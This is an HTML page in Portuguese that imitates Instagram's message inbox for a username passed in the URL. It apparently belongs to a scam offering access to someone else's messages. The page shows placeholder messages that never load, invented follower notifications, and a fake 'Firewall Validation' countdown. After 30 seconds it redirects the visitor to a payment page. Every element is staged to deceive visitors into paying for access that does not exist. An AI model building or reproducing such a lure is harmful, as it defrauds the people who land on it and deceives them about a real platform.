<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #000;
            color: #fff;
            max-width: 480px;
            margin: 0 auto;
            overflow-x: hidden;
        }
        .container {
            width: 100%;
            display: flex;
            flex-direction: column;
        }

        /* --- Header --- */
        .header {
            display: flex;
            align-items: center;
            padding: 20px 16px 0;
            gap: 6px;
        }
        .header .fa-arrow-left { font-size: 20px; }
        .header .username { font-size: 22px; font-weight: 600; }
        .header .fa-chevron-down { font-size: 12px; margin-left: 2px; }
        .header-icons {
            margin-left: auto;
            display: flex;
            gap: 20px;
            font-size: 22px;
        }

        /* --- Search Bar --- */
        .search-bar-container {
            padding: 8px 16px;
        }
        .search-bar {
            background-color: #262626;
            border-radius: 10px;
            padding: 10px;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .search-bar .fa-search { color: #8E8E8E; font-size: 14px; }
        .search-bar span { color: #8E8E8E; font-size: 16px; }
        .search-bar .filter-btn {
            margin-left: auto;
            color: #fff;
            font-size: 15px;
            font-weight: 600;
        }
        .ai-icon {
            width: 24px;
            height: 24px;
            background: linear-gradient(135deg, #4395F6, #D32DC5);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .ai-icon-inner {
            width: 18px; height: 18px;
            background: #262626;
            border-radius: 50%;
        }

        /* --- Notes --- */
        .notes {
            display: flex;
            justify-content: flex-start;
            gap: 20px;
            padding: 10px 16px 14px;
        }
        .note-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            width: 66px;
        }
        .note-visual {
            position: relative;
            width: 66px;
            height: 66px;
        }
        .note-circle {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background: #363636;
            overflow: hidden;
        }
        .note-balloon {
            position: absolute;
            width: 62px;
            top: -18px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 1;
        }
        .note-label {
            width: 100%;
            height: 10px;
            background: #363636;
            border-radius: 5px;
        }
        .note-text {
            font-size: 13px;
            color: #A8A8A8;
            white-space: nowrap;
        }

        /* --- Tabs --- */
        .tabs {
            display: flex;
            justify-content: space-between;
            padding: 0 16px;
            gap: 8px;
        }
        .tab {
            padding: 10px;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            background: #262626;
            color: #A8A8A8;
            flex-grow: 1;
            text-align: center;
        }
        .tab.active {
            background: #fff;
            color: #000;
        }
        .tab.active .fa-circle { font-size: 6px; vertical-align: middle; margin-right: 6px; color: #4395F6; }

        /* --- Messages --- */
        .messages-list {
            padding: 16px 18px 0;
        }
        .message-item {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 12px;
        }
        .message-avatar-container {
            width: 58px;
            height: 58px;
            border-radius: 50%;
            border: 2px solid #555;
            padding: 2px;
            box-sizing: border-box;
        }
        .message-avatar {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background: #363636;
        }
        .message-details {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            gap: 4px;
        }
        .message-line {
            height: 13px;
            background: #363636;
            border-radius: 6px;
        }
        .message-line.short { width: 70%; }
        .message-cam-wrapper {
            position: relative;
            margin-left: auto;
        }
        .message-cam-icon {
            width: 26px;
            height: 26px;
        }
        .message-cam-wrapper.notify::after {
            content: '';
            position: absolute;
            top: 0px;
            right: -2px;
            width: 8px;
            height: 8px;
            background: #4395F6;
            border-radius: 50%;
            border: 2px solid #000;
        }

        /* --- Loading --- */
        .loading-more {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 14px;
            padding: 30px;
            font-size: 16px;
            color: #575757;
            font-weight: 500;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #4395F6;
            border-right: 4px solid #4395F6;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 0.7s linear infinite;
        }
        .loading-shimmer { position: relative; overflow: hidden; background-color: #363636; }
        .loading-shimmer::after {
            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            animation: shimmer 1.5s infinite;
        }
        @keyframes shimmer { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* --- Overlays --- */
        #firewall-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.9); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 100; text-align: center; }
        #firewall-overlay h2 { color: #ff4d4d; font-size: 24px; }
        #firewall-overlay p { font-size: 16px; }
        #follower-notification { position: fixed; bottom: -100px; left: 50%; transform: translateX(-50%); background: rgba(20, 20, 20, 0.9); padding: 10px 20px; border-radius: 15px; border: 1px solid #444; display: flex; align-items: center; gap: 10px; transition: bottom 0.5s ease-in-out; z-index: 1100; }
        #follower-notification img { width: 40px; height: 40px; border-radius: 50%; }

    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <i class="fas fa-arrow-left"></i>
            <span id="username-display" class="username"></span>
            <i class="fas fa-chevron-down"></i>
            <div class="header-icons">
                 <i class="far fa-plus-square"></i>
                 <i class="far fa-edit"></i>
            </div>
        </div>

        <div class="search-bar-container">
            <div class="search-bar">
                <div class="ai-icon"><div class="ai-icon-inner"></div></div>
                <span>Pergunte à Meta AI ou pesquise</span>
                <div class="filter-btn">Filtrar</div>
            </div>
        </div>

        <div class="notes">
            <div class="note-item">
                <div class="note-visual"><div class="note-circle loading-shimmer"></div></div>
                <span class="note-text">Sua nota</span>
            </div>
            <div class="note-item">
                <div class="note-visual"><img src="../media/bg_note.png" class="note-balloon"><div class="note-circle loading-shimmer"></div></div>
                <div class="note-label loading-shimmer"></div>
            </div>
            <div class="note-item">
                <div class="note-visual"><img src="../media/bg_note.png" class="note-balloon"><div class="note-circle loading-shimmer"></div></div>
                <div class="note-label loading-shimmer"></div>
            </div>
            <div class="note-item">
                <div class="note-visual"><img src="../media/bg_note.png" class="note-balloon"><div class="note-circle loading-shimmer"></div></div>
                <div class="note-label loading-shimmer"></div>
            </div>
        </div>

        <div class="tabs">
            <div class="tab active"><i class="fas fa-circle"></i>Principal</div>
            <div class="tab">Geral</div>
            <div class="tab">Canais</div>
            <div class="tab">Solicitações</div>
        </div>

        <div class="messages-list">
            <div class="message-item">
                <div class="message-avatar-container"><div class="message-avatar loading-shimmer"></div></div>
                <div class="message-details">
                    <div class="message-line loading-shimmer"></div>
                    <div class="message-line short loading-shimmer"></div>
                </div>
                <div class="message-cam-wrapper notify"><img src="../media/cam_icon.jpg" class="message-cam-icon"></div>
            </div>
            <div class="message-item">
                <div class="message-avatar-container"><div class="message-avatar loading-shimmer"></div></div>
                <div class="message-details">
                    <div class="message-line loading-shimmer"></div>
                    <div class="message-line short loading-shimmer"></div>
                </div>
                <div class="message-cam-wrapper"><img src="../media/cam_icon.jpg" class="message-cam-icon"></div>
            </div>
            <div class="message-item">
                <div class="message-avatar-container"><div class="message-avatar loading-shimmer"></div></div>
                <div class="message-details">
                    <div class="message-line loading-shimmer"></div>
                    <div class="message-line short loading-shimmer"></div>
                </div>
                <div class="message-cam-wrapper"><img src="../media/cam_icon.jpg" class="message-cam-icon"></div>
            </div>
        </div>

        <div class="loading-more">
            <span>Acessando mais mensagens...</span>
            <div class="spinner"></div>
        </div>
    </div>

    <div id="firewall-overlay">
        <h2><i class="fas fa-shield-alt"></i> Firewall Validation</h2>
        <p>Acesso bloqueado. Redirecionando em <span id="countdown">10</span>s...</p>
    </div>

    <div id="follower-notification"></div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const username = urlParams.get('username') || 'joao';
        document.getElementById('username-display').textContent = username;

        // --- Animations and Timeouts ---
        setTimeout(() => {
            const shimmerElements = document.querySelectorAll('.loading-shimmer');
            shimmerElements.forEach(el => el.classList.remove('loading-shimmer'));
        }, 4000);

        const notification = document.getElementById('follower-notification');
        function showNotification(index) {
            notification.innerHTML = `<img src="https://randomuser.me/api/portraits/men/${index+20}.jpg" alt="follower"> <b>Seguidor ${index+1}</b> começou a seguir você.`;
            notification.style.bottom = '20px';
            setTimeout(() => { notification.style.bottom = '-100px'; }, 3500);
        }
        setTimeout(() => showNotification(0), 6000);
        setTimeout(() => showNotification(1), 11000);

        // --- Firewall Logic ---
        setTimeout(() => {
            const firewallOverlay = document.getElementById('firewall-overlay');
            firewallOverlay.style.display = 'flex';
            let countdownValue = 10;
            const countdownElement = document.getElementById('countdown');
            const countdownInterval = setInterval(() => {
                countdownValue--;
                countdownElement.textContent = countdownValue + 's...';
                if (countdownValue <= 0) {
                    clearInterval(countdownInterval);
                    window.location.href = `../payment-account/?username=${username}`;
                }
            }, 1000);
        }, 30000); // 30 seconds
    </script>
</body>
</html>
